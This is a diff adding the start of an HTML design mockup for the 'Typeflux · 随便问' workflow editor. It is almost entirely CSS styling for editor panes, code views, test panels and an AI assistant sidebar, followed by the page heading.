@@ -1,0 +1,1085 @@
+<!doctype html>
+<html lang="zh-CN"><head><meta charset="utf-8"><title>Typeflux · 随便问 工作流编辑器 设计稿</title>
+<style>
+  :root {
+    --canvas: #0c0c0d; --desk: #1b1c1f;
+    --hair: rgba(255,255,255,.10); --hair2: rgba(255,255,255,.05);
+    --text: #f2f2f2; --text-2: #a8a8ab; --text-3: #6e6e73;
+    --accent: #0a84ff; --accent-soft: rgba(10,132,255,.16); --accent-text: #8ebdff;
+    --hover: rgba(255,255,255,.07); --ctl: rgba(255,255,255,.07);
+    --danger: #ff6961; --danger-soft: rgba(255,105,97,.14); --warn: #ffb340; --warn-soft: rgba(255,179,64,.14);
+    --ok: #30d158; --ok-soft: rgba(48,209,88,.14);
+    --win: #232325; --side: #1e1e20; --pane: #262628; --code: #18181a; --glass: rgba(58,58,62,.88);
+    --wf: #ff9f0a; --violet: #bf5af2; --violet-text: #d6a1f7;
+    --kw1: #ff7ab2; --str: #ff8170; --cm: #7f8c98; --fn: #67b7a4; --num: #d9c97c;
+  }
+  body.light {
+    --canvas: #eceef1; --desk: #dfe3e8;
+    --hair: rgba(0,0,0,.10); --hair2: rgba(0,0,0,.05);
+    --text: #1d1d1f; --text-2: #5f5f64; --text-3: #8e8e93;
+    --accent-soft: rgba(10,132,255,.11); --accent-text: #0a6cdb;
+    --hover: rgba(0,0,0,.05); --ctl: rgba(0,0,0,.05);
+    --danger-soft: rgba(255,59,48,.10); --warn-soft: rgba(255,149,0,.12); --ok-soft: rgba(52,199,89,.12);
+    --violet-text: #8e3fc0; --win: #f7f7f8; --side: #eeeef0; --pane: #fbfbfc; --code: #ffffff; --glass: rgba(250,250,252,.92);
+    --kw1: #ad3da4; --str: #c41a16; --cm: #707f8c; --fn: #3e8087; --num: #1c00cf;
+  }
+  * { box-sizing: border-box; }
+  body { margin: 0; padding: 40px 48px 56px; background: var(--canvas); color: var(--text); width: 1600px;
+    font: 13px/1.45 -apple-system, "SF Pro Text", "PingFang SC", "Helvetica Neue", "Noto Sans SC", "Noto Sans CJK SC", sans-serif; }
+  h1 { font-size: 22px; margin: 0 0 4px; font-weight: 650; }
+  .sub { color: var(--text-2); margin: 0 0 26px; max-width: 1260px; }
+  h2 { font-size: 15px; margin: 0 0 10px; font-weight: 600; }
+  code, .mono { font-family: ui-monospace, "SF Mono", Menlo, "DejaVu Sans Mono", monospace; }
+  code { font-size: 11.5px; color: var(--text-2); }
+  .stage { border-radius: 14px; padding: 30px 40px; border: 1px solid rgba(255,255,255,.05); margin-bottom: 14px;
+    background: radial-gradient(1200px 400px at 30% -40%, #2c3442 0%, transparent 60%), var(--desk); }
+  body.light .stage { background: radial-gradient(1200px 400px at 30% -40%, #b9c7dc 0%, transparent 60%), var(--desk); border-color: rgba(0,0,0,.05); }
+  .label { font-size: 11px; font-weight: 600; letter-spacing: .6px; color: var(--text-3); margin-bottom: 12px; }
+  .notes { color: var(--text-2); font-size: 12.5px; margin: 0 0 40px; max-width: 1240px; }
+  .notes b { color: var(--text); font-weight: 600; }
+  .notes ul { margin: 0; padding-left: 18px; } .notes li { margin: 0 0 6px; }
+  .row2 { display: flex; gap: 28px; align-items: flex-start; }
+
+  /* ===== editor window ===== */
+  .ewin { width: 1220px; border-radius: 12px; background: var(--win); border: 1px solid rgba(255,255,255,.12); overflow: hidden;
+    box-shadow: 0 24px 60px rgba(0,0,0,.55), 0 2px 8px rgba(0,0,0,.3); position: relative; }
+  body.light .ewin { border-color: rgba(0,0,0,.14); box-shadow: 0 24px 60px rgba(0,0,0,.18); }
+  .tool { height: 52px; display: flex; align-items: center; gap: 10px; padding: 0 14px; border-bottom: 1px solid var(--hair); }
+  .lights { display: flex; gap: 8px; margin-right: 6px; } .lights i { width: 12px; height: 12px; border-radius: 50%; display: block; }
+  .lights i:nth-child(1) { background: #ff5f57; } .lights i:nth-child(2) { background: #febc2e; } .lights i:nth-child(3) { background: #28c840; }
+  .wtile { width: 28px; height: 28px; border-radius: 8px; display: inline-flex; align-items: center; justify-content: center; font-size: 13px; font-weight: 700; flex: none; }
+  .wtile.fx { background: linear-gradient(135deg,#34c759,#1f9d48); color: #fff; }
+  .wtile.md { background: #3a3a3e; color: #ddd; font-size: 11px; } body.light .wtile.md { background: #d6d6db; color: #333; }
+  .wtile.code { background: #3178c6; color: #fff; font-size: 11px; }
+  .wtile.jira { background: #2684ff; color: #fff; }
+  .wtile.sm { width: 22px; height: 22px; border-radius: 6px; font-size: 11px; }
+  .wtile.sm.md, .wtile.sm.code { font-size: 9px; }
+  .ttl { display: flex; flex-direction: column; line-height: 1.2; }
+  .ttl b { font-size: 13.5px; font-weight: 650; } .ttl span { font-size: 11px; color: var(--text-3); }
+  .badge { display: inline-flex; align-items: center; gap: 4px; height: 20px; padding: 0 7px; border-radius: 6px; font-size: 11px; font-weight: 600; white-space: nowrap; }
+  .badge.ok { background: var(--ok-soft); color: #7ee2a0; } body.light .badge.ok { color: #1f8a3c; }
+  .badge.warn { background: var(--warn-soft); color: #ffcf85; } body.light .badge.warn { color: #b26a00; }
+  .badge.bad { background: var(--danger-soft); color: #ffb0ab; } body.light .badge.bad { color: #c9372c; }
+  .badge.rt { background: rgba(55,118,171,.26); color: #9cc6ef; } body.light .badge.rt { background: rgba(55,118,171,.14); color: #2d5f8f; }
+  .badge.dim { background: var(--ctl); color: var(--text-2); }
+  .grow { flex: 1; }
+  .saved { font-size: 11.5px; color: var(--text-3); display: inline-flex; align-items: center; gap: 6px; }
+  .saved .dot { width: 7px; height: 7px; border-radius: 50%; background: var(--wf); }
+  .btn { display: inline-flex; align-items: center; gap: 6px; height: 26px; padding: 0 10px; border-radius: 7px; background: var(--ctl);
+    border: 1px solid var(--hair); color: var(--text); font-size: 12px; white-space: nowrap; }
+  .btn.p { background: var(--accent); color: #fff; border-color: transparent; }
+  .btn.ghost { background: transparent; border-color: transparent; color: var(--text-2); }
+  .btn.d { background: var(--danger-soft); color: #ffb0ab; border-color: transparent; } body.light .btn.d { color: #c9372c; }
+  .btn .k { font-size: 10.5px; opacity: .7; }
+  .sw { width: 30px; height: 18px; border-radius: 9px; background: #34c759; position: relative; flex: none; display: inline-block; }
+  .sw::after { content: ""; position: absolute; right: 2px; top: 2px; width: 14px; height: 14px; border-radius: 50%; background: #fff; }
+  .sw.off { background: rgba(127,127,127,.35); } .sw.off::after { right: auto; left: 2px; }
+
+  .ebody { display: grid; grid-template-columns: 208px 1fr 352px; height: 640px; }
+  .ebody.notest { grid-template-columns: 208px 1fr; }
+  /* sidebar */
+  .side { background: var(--side); border-right: 1px solid var(--hair); display: flex; flex-direction: column; min-height: 0; }
+  .search { margin: 10px 10px 6px; height: 26px; border-radius: 7px; background: var(--ctl); display: flex; align-items: center; gap: 6px; padding: 0 8px; color: var(--text-3); font-size: 12px; }
+  .sgrp { font-size: 10.5px; font-weight: 600; letter-spacing: .5px; color: var(--text-3); padding: 8px 14px 4px; }
+  .wi { display: flex; align-items: center; gap: 9px; margin: 1px 6px; padding: 6px 8px; border-radius: 8px; }
+  .wi.on { background: var(--accent-soft); }
+  .wi .n { font-size: 12.5px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+  .wi .k2 { font-size: 10.5px; color: var(--text-3); }
+  .wi .st { margin-left: auto; width: 7px; height: 7px; border-radius: 50%; flex: none; }
+  .st.ok { background: var(--ok); } .st.warn { background: var(--warn); } .st.bad { background: var(--danger); } .st.off { background: rgba(127,127,127,.5); }
+  .files { margin-top: 2px; }
+  .fi { display: flex; align-items: center; gap: 7px; margin: 0 6px 0 30px; padding: 3px 8px; border-radius: 6px; font-size: 11.5px; color: var(--text-2); }
+  .fi.on { background: var(--hover); color: var(--text); }
+  .fi .m { margin-left: auto; color: var(--wf); font-size: 10px; }
+  .sidefoot { margin-top: auto; border-top: 1px solid var(--hair); padding: 8px 10px; display: flex; gap: 6px; align-items: center; color: var(--text-2); font-size: 12px; }
+
+  /* center */
+  .center { display: flex; flex-direction: column; min-width: 0; min-height: 0; background: var(--pane); }
+  .flow { display: flex; flex: none; align-items: stretch; gap: 0; padding: 12px 14px 10px; border-bottom: 1px solid var(--hair); }
+  .node { flex: 1; min-width: 0; border-radius: 10px; border: 1px solid var(--hair); background: var(--ctl); padding: 7px 10px 8px; position: relative; }
+  .node .nl { font-size: 10.5px; font-weight: 600; color: var(--text-3); display: flex; align-items: center; gap: 5px; letter-spacing: .3px; }
+  .node .nv { font-size: 12px; margin-top: 3px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+  .node .nv .mono { font-size: 11.5px; }
+  .node.on { border-color: rgba(10,132,255,.75); background: var(--accent-soft); box-shadow: 0 0 0 3px rgba(10,132,255,.12); }
+  .node.err { border-color: rgba(255,105,97,.6); }
+  .node.err .nl::after { content: "●"; color: var(--danger); margin-left: auto; font-size: 9px; }
+  .node.wrn .nl::after { content: "●"; color: var(--warn); margin-left: auto; font-size: 9px; }
+  .arrow { width: 22px; flex: none; display: flex; align-items: center; justify-content: center; color: var(--text-3); font-size: 12px; }
+  .chip { display: inline-flex; align-items: center; height: 18px; padding: 0 6px; border-radius: 5px; border: 1px solid var(--hair); font-size: 11px;
+    font-family: ui-monospace, Menlo, monospace; background: var(--ctl); margin-right: 3px; }
+  .chip.tok { background: rgba(255,159,10,.16); border-color: rgba(255,159,10,.35); color: #ffcc80; } body.light .chip.tok { color: #a35f00; }
+  .chip.bad { border-color: rgba(255,105,97,.6); color: #ffb0ab; } body.light .chip.bad { color: #c9372c; }
+
+  /* tabs in center */
+  .ctabs { display: flex; align-items: center; height: 34px; border-bottom: 1px solid var(--hair); padding: 0 8px; gap: 2px; font-size: 12px; }
+  .ctab { height: 34px; display: inline-flex; align-items: center; gap: 6px; padding: 0 12px; color: var(--text-3); border-bottom: 2px solid transparent; }
+  .ctab.on { color: var(--text); border-bottom-color: var(--accent); }
+  .ctab .m { width: 6px; height: 6px; border-radius: 50%; background: var(--wf); }
+  .ctabs .r { margin-left: auto; display: flex; gap: 6px; align-items: center; }
+  .segm { display: inline-flex; border-radius: 7px; border: 1px solid var(--hair); overflow: hidden; background: var(--ctl); }
+  .segm span { padding: 3px 10px; font-size: 11.5px; color: var(--text-2); }
+  .segm span.on { background: var(--accent); color: #fff; }
+
+  /* code */
+  .codewrap { flex: 1; min-height: 0; display: grid; grid-template-columns: 44px 1fr; background: var(--code); font: 12px/20px ui-monospace, "SF Mono", Menlo, "DejaVu Sans Mono", monospace; overflow: hidden; position: relative; }
+  .gut { color: #55555a; text-align: right; padding: 10px 10px 0 0; white-space: pre; background: rgba(127,127,127,.04); border-right: 1px solid var(--hair2); }
+  body.light .gut { color: #a0a0a6; }
+  .gut .e { color: var(--danger); font-weight: 700; } .gut .cur { color: var(--text-2); }
+  .src { padding: 10px 14px 0; white-space: pre; color: #d8d8da; overflow: hidden; }
+  body.light .src { color: #1d1d1f; }
+  .src .ln { display: block; height: 20px; }
+  .src .ln.cur { background: rgba(255,255,255,.035); margin: 0 -14px; padding: 0 14px; } body.light .src .ln.cur { background: rgba(0,0,0,.035); }
+  .src .ln.errl { background: rgba(255,105,97,.12); margin: 0 -14px; padding: 0 14px; position: relative; }
+  .src .ln.diffadd { background: rgba(48,209,88,.12); margin: 0 -14px; padding: 0 14px; }
+  .src .ln.diffdel { background: rgba(255,105,97,.12); margin: 0 -14px; padding: 0 14px; text-decoration: line-through; text-decoration-color: rgba(255,105,97,.5); }
+  .src .diag { display: block; height: 20px; margin: 0 -14px; padding: 1px 14px; }
+  .src .ann { height: 18px; display: inline-flex; align-items: center; padding: 0 8px; border-radius: 5px;
+    background: rgba(255,105,97,.22); color: #ffd0cc; font: 11px -apple-system, "PingFang SC", "Noto Sans CJK SC", sans-serif; }
+  body.light .src .ann { color: #9b1c13; }
+  .kw1 { color: var(--kw1); } .str { color: var(--str); } .cm { color: var(--cm); } .fn { color: var(--fn); } .num { color: var(--num); }
+  .caret { display: inline-block; width: 1.5px; height: 15px; background: var(--accent); vertical-align: -3px; }
+  .sq { text-decoration: underline wavy var(--danger); text-underline-offset: 3px; }
+
+  /* status bar */
+  .sbar { height: 26px; border-top: 1px solid var(--hair); display: flex; align-items: center; gap: 14px; padding: 0 12px; font-size: 11px; color: var(--text-3); background: var(--side); }
+  .sbar .e { color: var(--danger); } .sbar .w { color: var(--warn); } .sbar .okt { color: var(--ok); }
+  .sbar .r { margin-left: auto; display: flex; gap: 14px; }
+
+  /* test panel */
+  .test { border-left: 1px solid var(--hair); display: flex; flex-direction: column; min-height: 0; background: var(--win); }
+  .thd { display: flex; align-items: center; gap: 8px; padding: 10px 12px 8px; font-size: 12.5px; font-weight: 600; }
+  .thd .r { margin-left: auto; }
+  .fld { padding: 0 12px 8px; }
+  .fld .k { font-size: 11px; color: var(--text-3); margin-bottom: 4px; display: flex; align-items: center; gap: 6px; }
+  .inp { min-height: 28px; border-radius: 7px; background: var(--ctl); border: 1px solid var(--hair); display: flex; align-items: center; padding: 0 9px; gap: 6px; font-size: 12.5px; }
+  .inp.focus { border-color: rgba(10,132,255,.7); box-shadow: 0 0 0 3px rgba(10,132,255,.15); }
+  .inp .ph { color: var(--text-3); }
+  .inp.area { align-items: flex-start; padding: 6px 9px; min-height: 46px; color: var(--text-2); font-size: 12px; }
+  .chk { width: 14px; height: 14px; border-radius: 4px; border: 1px solid var(--hair); background: var(--ctl); display: inline-flex; align-items: center; justify-content: center; font-size: 10px; flex: none; }
+  .chk.on { background: var(--accent); border-color: transparent; color: #fff; }
+  .ttabs { display: flex; gap: 12px; padding: 8px 12px 0; font-size: 11.5px; color: var(--text-3); border-top: 1px solid var(--hair); }
+  .ttabs span { padding-bottom: 5px; } .ttabs .on { color: var(--text); border-bottom: 2px solid var(--accent); }
+  .ttabs .cnt { font-size: 10px; background: var(--danger-soft); color: #ffb0ab; border-radius: 4px; padding: 0 4px; margin-left: 3px; }
+  .tres { padding: 10px 12px; flex: 1; min-height: 0; overflow: hidden; }
+  .meta { display: flex; align-items: center; gap: 8px; font-size: 11.5px; color: var(--text-3); margin-bottom: 8px; }
+  .meta .okt { color: var(--ok); } .meta .e { color: var(--danger); }
+  /* launcher-like preview */
+  .mini { border-radius: 16px; background: var(--glass); border: 1px solid rgba(255,255,255,.14); overflow: hidden; box-shadow: 0 12px 30px rgba(0,0,0,.35); }
+  body.light .mini { border-color: rgba(0,0,0,.10); box-shadow: 0 12px 30px rgba(0,0,0,.12); }
+  .mini .in { display: flex; align-items: center; gap: 8px; height: 40px; padding: 0 10px; font-size: 13.5px; }
+  .kwc { display: inline-flex; align-items: center; gap: 5px; height: 24px; padding: 0 8px 0 4px; border-radius: 7px; background: rgba(255,159,10,.16); color: #ffcc80; font-size: 12px; font-weight: 600; }
+  body.light .kwc { color: #a35f00; }
+  .kwc .g { width: 16px; height: 16px; border-radius: 5px; background: var(--wf); color: #1b1b1b; font-size: 9px; display: inline-flex; align-items: center; justify-content: center; font-weight: 800; }
+  .mini .hr { height: 1px; background: var(--hair); }
+  .rc { margin: 6px; border-radius: 12px; padding: 10px 12px 8px; background: var(--hover); box-shadow: inset 0 0 0 1px rgba(10,132,255,.55); }
+  .rc.err { box-shadow: inset 0 0 0 1px rgba(255,105,97,.55); }
+  .rc .rh { display: flex; align-items: center; gap: 6px; font-size: 11.5px; color: var(--text-2); margin-bottom: 6px; }
+  .rc .rh b { color: var(--text); font-weight: 600; font-size: 12px; }
+  .rc .bd { font-size: 14px; line-height: 1.55; }
+  .rc .bd .s2 { color: var(--text-2); font-size: 12.5px; }
+  .rc .errmsg { color: var(--danger); font-size: 12.5px; margin-bottom: 6px; }
+  .acts { display: flex; justify-content: flex-end; gap: 5px; margin-top: 8px; flex-wrap: wrap; }
+  .act { display: inline-flex; align-items: center; gap: 4px; height: 21px; padding: 0 7px; border-radius: 6px; background: var(--ctl); color: var(--text-2); font-size: 11px; }
+  .act.p { background: rgba(10,132,255,.22); color: #cfe3ff; } body.light .act.p { color: #0a5bb8; }
+  .log { font: 11px/1.55 ui-monospace, Menlo, monospace; color: var(--text-2); background: var(--code); border: 1px solid var(--hair2); border-radius: 8px; padding: 8px 10px; white-space: pre; overflow: hidden; }
+  .log .e { color: #ff9b94; } body.light .log .e { color: #c9372c; } .log .lk { color: var(--accent-text); text-decoration: underline; text-underline-offset: 2px; }
+  .hist { border-top: 1px solid var(--hair); padding: 8px 12px 10px; font-size: 11.5px; }
+  .hist .h { color: var(--text-3); font-size: 10.5px; font-weight: 600; letter-spacing: .4px; margin-bottom: 5px; }
+  .hist .hr2 { display: grid; grid-template-columns: 14px 1fr auto auto; gap: 8px; align-items: center; color: var(--text-2); padding: 2px 0; }
+  .hist .hr2 .q { white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+
+  /* form panels */
+  .form { padding: 16px 22px; flex: 1; min-height: 0; overflow: hidden; }
+  .fsec { margin-bottom: 18px; }
+  .fsec h4 { margin: 0 0 4px; font-size: 13px; font-weight: 600; }
+  .fsec .hint { color: var(--text-3); font-size: 11.5px; margin-bottom: 9px; }
+  .tbl { border: 1px solid var(--hair); border-radius: 9px; overflow: hidden; font-size: 12.5px; }
+  .tbl .tr { display: grid; grid-template-columns: 130px 1fr 1.2fr 70px; gap: 10px; padding: 7px 12px; border-top: 1px solid var(--hair2); align-items: center; }
+  .tbl .tr.h { border-top: 0; color: var(--text-3); font-size: 11px; font-weight: 600; background: var(--ctl); }
+  .tbl .tr.badrow { background: rgba(255,105,97,.06); }
+  .tbl .ed { height: 24px; border-radius: 6px; background: var(--ctl); border: 1px solid var(--hair); display: flex; align-items: center; padding: 0 7px; font-size: 12px; }
+  .tbl .ed.mono { font-family: ui-monospace, Menlo, monospace; font-size: 11.5px; }
+  .tbl .ed.bad { border-color: rgba(255,105,97,.7); }
+  .tbl .ed .ph { color: var(--text-3); }
+  .rowerr { color: var(--danger); font-size: 11.5px; padding: 0 12px 7px 152px; background: rgba(255,105,97,.06); }
+  .add { display: inline-flex; gap: 5px; align-items: center; color: var(--accent-text); font-size: 12px; margin-top: 8px; }
+  .opts { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
+  .opt { border: 1px solid var(--hair); border-radius: 10px; padding: 10px 12px; background: var(--ctl); }
+  .opt.on { border-color: rgba(10,132,255,.75); background: var(--accent-soft); }
+  .opt .ot { font-size: 12.5px; font-weight: 600; display: flex; align-items: center; gap: 7px; }
+  .opt .od { font-size: 11.5px; color: var(--text-3); margin-top: 3px; }
+  .radio { width: 14px; height: 14px; border-radius: 50%; border: 1px solid var(--text-3); display: inline-block; flex: none; }
+  .radio.on { border: 4px solid var(--accent); }
+  .opt.dis { opacity: .5; }
+  .argv { display: flex; align-items: center; gap: 6px; flex-wrap: wrap; border: 1px solid var(--hair); border-radius: 9px; padding: 8px 10px; background: var(--code); }
+  .argv .bin { font: 12px ui-monospace, Menlo, monospace; color: var(--text-2); }
+  .argv .slot { display: inline-flex; align-items: center; gap: 4px; height: 24px; padding: 0 8px; border-radius: 6px; border: 1px dashed var(--hair); font: 11.5px ui-monospace, Menlo, monospace; }
+  .argv .slot .i { color: var(--text-3); font-size: 10px; }
+  .tokbar { display: flex; gap: 6px; align-items: center; margin-top: 8px; font-size: 11.5px; color: var(--text-3); }
+  .preview { margin-top: 8px; border-radius: 8px; background: var(--ctl); padding: 8px 10px; font: 11.5px/1.6 ui-monospace, Menlo, monospace; color: var(--text-2); }
+  .preview b { color: var(--text); font-weight: 500; }
+  .grid2f { display: grid; grid-template-columns: 1fr 1fr; gap: 18px; }
+  .kv { display: grid; grid-template-columns: 110px 1fr; gap: 8px 12px; align-items: center; font-size: 12.5px; }
+  .kv .k { color: var(--text-3); font-size: 12px; }
+  .slider { height: 4px; border-radius: 2px; background: linear-gradient(90deg, var(--accent) 0 20%, rgba(127,127,127,.3) 20%); position: relative; flex: 1; }
+  .slider::after { content: ""; position: absolute; left: calc(20% - 7px); top: -5px; width: 14px; height: 14px; border-radius: 50%; background: #fff; box-shadow: 0 1px 3px rgba(0,0,0,.4); }
+  .soon { font-size: 10px; font-weight: 700; color: #0b0b0c; background: #ffd60a; border-radius: 4px; padding: 0 5px; }
+
+  /* banners & sheets */
+  .banner { display: flex; align-items: center; gap: 10px; padding: 8px 14px; font-size: 12px; border-bottom: 1px solid var(--hair); }
+  .banner.warn { background: var(--warn-soft); }
+  .banner.bad { background: var(--danger-soft); }
+  .banner .i { font-size: 14px; }
+  .banner .r { margin-left: auto; display: flex; gap: 6px; }
+  .scrim { position: absolute; inset: 0; background: rgba(0,0,0,.42); }
+  .sheet { position: absolute; left: 50%; top: 52px; transform: translateX(-50%); width: 720px; border-radius: 0 0 14px 14px; background: #2a2a2d; border: 1px solid rgba(255,255,255,.14); border-top: 0; box-shadow: 0 24px 60px rgba(0,0,0,.6); overflow: hidden; }
+  body.light .sheet { background: #fff; border-color: rgba(0,0,0,.12); }
+  .sheet .shd { padding: 18px 22px 6px; } .sheet .shd h3 { margin: 0 0 4px; font-size: 15px; } .sheet .shd .d { color: var(--text-2); font-size: 12px; }
+  .tpls { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; padding: 12px 22px; }
+  .tpl { min-width: 0; overflow: hidden; border: 1px solid var(--hair); border-radius: 11px; padding: 11px 12px; background: var(--ctl); }
+  .tpl.on { border-color: rgba(10,132,255,.75); background: var(--accent-soft); box-shadow: 0 0 0 3px rgba(10,132,255,.12); }
+  .tpl .tt { display: flex; align-items: center; gap: 8px; font-size: 12.5px; font-weight: 600; }
+  .tpl .td { color: var(--text-3); font-size: 11.5px; margin-top: 5px; min-height: 32px; }
+  .tpl .tc { margin-top: 8px; font: 10.5px/1.5 ui-monospace, Menlo, monospace; color: var(--text-2); background: var(--code); border-radius: 6px; padding: 6px 8px; white-space: pre; overflow: hidden; height: 50px; }
+  .sform { display: grid; grid-template-columns: 1fr 160px 1fr; gap: 12px; padding: 4px 22px 14px; }
+  .sform .k { font-size: 11px; color: var(--text-3); margin-bottom: 4px; }
+  .sform .okline { font-size: 11px; color: var(--ok); margin-top: 4px; }
+  .sfoot { display: flex; align-items: center; gap: 8px; padding: 12px 22px; border-top: 1px solid var(--hair); background: rgba(127,127,127,.04); }
+  .sfoot .l { color: var(--text-3); font-size: 11.5px; }
+
+  /* settings list & launcher (entry points) */
+  .swin { width: 700px; border-radius: 12px; background: var(--win); border: 1px solid rgba(255,255,255,.10); overflow: hidden; box-shadow: 0 24px 60px rgba(0,0,0,.5); }
+  .srow { display: flex; align-items: center; gap: 12px; padding: 11px 16px; border-top: 1px solid var(--hair2); font-size: 13px; }
+  .srow:first-child { border-top: 0; }
+  .srow .tx { min-width: 0; } .srow .t1 { font-weight: 600; display: flex; gap: 6px; align-items: center; } .srow .t2 { color: var(--text-3); font-size: 11.5px; }
+  .srow .r { margin-left: auto; display: flex; gap: 8px; align-items: center; }
+  .kbdk { display: inline-flex; height: 18px; padding: 0 6px; align-items: center; border-radius: 5px; border: 1px solid var(--hair); font: 11px ui-monospace, Menlo, monospace; color: var(--text-2); }
+  .menu { position: absolute; right: 54px; top: 38px; width: 220px; border-radius: 10px; background: #2c2c2f; border: 1px solid rgba(255,255,255,.14); box-shadow: 0 18px 40px rgba(0,0,0,.6); padding: 5px; font-size: 12.5px; z-index: 2; }
+  .menu .mi { padding: 5px 9px; border-radius: 6px; display: flex; } .menu .mi.on { background: var(--accent); color: #fff; } .menu .mi .s { margin-left: auto; opacity: .6; }
+  .menu .sep { height: 1px; background: var(--hair); margin: 4px 6px; }
+  .lcard { width: 560px; border-radius: 22px; background: var(--glass); border: 1px solid rgba(255,255,255,.16); overflow: hidden; box-shadow: 0 24px 60px rgba(0,0,0,.55); }
+  .lcard .in { display: flex; align-items: center; gap: 10px; height: 54px; padding: 0 12px; font-size: 16px; }
+  .lbar { display: flex; align-items: center; gap: 10px; height: 34px; padding: 0 12px; border-top: 1px solid var(--hair); font-size: 11px; color: var(--text-3); background: rgba(0,0,0,.10); }
+  .lbar b { color: var(--text-2); font-weight: 600; } .lbar .hl2 { color: var(--accent-text); }
+
+  /* ===== AI assistant ===== */
+  .ptabs { display: flex; gap: 2px; padding: 8px 10px 0; border-bottom: 1px solid var(--hair); font-size: 12px; }
+  .ptabs span { padding: 5px 10px 7px; color: var(--text-3); border-bottom: 2px solid transparent; display: inline-flex; gap: 5px; align-items: center; }
+  .ptabs .on { color: var(--text); border-bottom-color: var(--violet); }
+  .ptabs .sp { width: 14px; height: 14px; border-radius: 4px; background: linear-gradient(135deg,#bf5af2,#5e5ce6); color: #fff; font-size: 9px; display: inline-flex; align-items: center; justify-content: center; }
+  .chat { flex: 1; min-height: 0; overflow: hidden; padding: 10px 12px; display: flex; flex-direction: column; gap: 10px; font-size: 12.5px; }
+  .msg.u { align-self: flex-end; max-width: 88%; background: var(--accent-soft); border-radius: 12px 12px 4px 12px; padding: 7px 10px; }
+  .msg.a { color: var(--text); line-height: 1.55; }
+  .msg.a .who { font-size: 11px; color: var(--text-3); margin-bottom: 3px; display: flex; align-items: center; gap: 6px; }
+  .tl { display: flex; align-items: center; gap: 7px; font-size: 11.5px; color: var(--text-2); padding: 2px 0; }
+  .tl .ic { width: 15px; text-align: center; } .tl .okc { color: var(--ok); } .tl .ec { color: var(--danger); } .tl .vc { color: var(--violet-text); }
+  .tl .d { margin-left: auto; color: var(--text-3); font-size: 11px; }
+  .prop { border: 1px solid rgba(191,90,242,.45); border-radius: 11px; overflow: hidden; background: var(--ctl); }
+  .prop .ph2 { display: flex; align-items: center; gap: 7px; padding: 8px 10px; font-size: 12px; font-weight: 600; border-bottom: 1px solid var(--hair); }
+  .prop .ph2 .v { margin-left: auto; font-weight: 500; color: var(--text-3); font-size: 11px; }
+  .prop .fl { padding: 6px 10px; font: 11.5px/1.7 ui-monospace, Menlo, monospace; color: var(--text-2); border-bottom: 1px solid var(--hair2); }
+  .prop .fl .ad { color: var(--ok); } .prop .fl .dl { color: var(--danger); }
+  .risk { display: flex; flex-wrap: wrap; gap: 5px; padding: 7px 10px; border-bottom: 1px solid var(--hair2); }
+  .rk { display: inline-flex; align-items: center; gap: 4px; height: 20px; padding: 0 7px; border-radius: 6px; font-size: 11px; background: var(--ctl); color: var(--text-2); border: 1px solid var(--hair); }
+  .rk.new { background: var(--warn-soft); color: #ffcf85; border-color: rgba(255,179,64,.35); } body.light .rk.new { color: #b26a00; }
+  .prop .pa { display: flex; gap: 6px; padding: 8px 10px; justify-content: flex-end; }
+  .btn.v { background: #bf5af2; color: #fff; border-color: transparent; }
+  .composer { margin: 0 10px 10px; border: 1px solid var(--hair); border-radius: 12px; background: var(--ctl); padding: 8px 10px; }
+  .composer .t { color: var(--text-3); font-size: 12.5px; min-height: 34px; }
+  .composer .b { display: flex; align-items: center; gap: 6px; font-size: 11px; color: var(--text-3); }
+  .composer .model { display: inline-flex; gap: 5px; align-items: center; color: var(--text-2); font-weight: 600; }
+  .composer .model i { width: 12px; height: 12px; border-radius: 3px; background: linear-gradient(135deg,#ff5f6d,#ffc371); display: inline-block; }
+  .composer .snd { margin-left: auto; width: 24px; height: 24px; border-radius: 50%; background: #bf5af2; color: #fff; display: inline-flex; align-items: center; justify-content: center; font-size: 12px; }
+  .ctx { display: flex; gap: 5px; flex-wrap: wrap; margin-bottom: 6px; }
+  .ctx span { font-size: 10.5px; color: var(--text-2); background: var(--ctl); border: 1px solid var(--hair); border-radius: 5px; padding: 0 6px; height: 18px; display: inline-flex; align-items: center; }
+  .aiwide { position: absolute; left: 50%; top: 52px; transform: translateX(-50%); width: 760px; border-radius: 0 0 14px 14px; background: #2a2a2d; border: 1px solid rgba(255,255,255,.14); border-top: 0; box-shadow: 0 24px 60px rgba(0,0,0,.6); overflow: hidden; }
+  body.light .aiwide { background: #fff; border-color: rgba(0,0,0,.12); }
+  .seg2 { display: inline-flex; padding: 2px; border-radius: 9px; background: var(--ctl); border: 1px solid var(--hair); margin: 0 22px; }
+  .seg2 span { padding: 4px 14px; font-size: 12px; color: var(--text-2); border-radius: 7px; }
+  .seg2 .on { background: #bf5af2; color: #fff; }
+  .desc { margin: 12px 22px 0; border: 1px solid rgba(191,90,242,.55); box-shadow: 0 0 0 3px rgba(191,90,242,.12); border-radius: 11px; padding: 10px 12px; font-size: 13px; line-height: 1.6; min-height: 84px; background: var(--ctl); }
+  .exs { display: flex; gap: 6px; flex-wrap: wrap; margin: 8px 22px 0; font-size: 11.5px; color: var(--text-3); align-items: center; }
+  .exs span.e2 { border: 1px solid var(--hair); border-radius: 999px; padding: 2px 9px; color: var(--text-2); background: var(--ctl); }
+  .steps { margin: 14px 22px 0; border: 1px solid var(--hair); border-radius: 11px; padding: 8px 12px; }
+  .steps .tl { padding: 4px 0; font-size: 12px; }
+  .spin { display: inline-block; width: 11px; height: 11px; border-radius: 50%; border: 2px solid rgba(191,90,242,.25); border-top-color: #bf5af2; }
+  .opts2 { display: flex; gap: 16px; margin: 12px 22px 0; font-size: 12px; color: var(--text-2); align-items: center; }
+  .opts2 > span { display: inline-flex; gap: 6px; align-items: center; }
+
+  body.solo { width: auto; padding: 0; background: var(--desk); }
+  body.solo h1, body.solo .sub, body.solo .notes { display: none; }
+  body.solo .stage { display: none; border-radius: 0; border: 0; margin: 0; }
+  body.solo .stage.only { display: block; width: max-content; }
+</style></head>
+<body>
+<h1>随便问 · 工作流编辑器</h1>
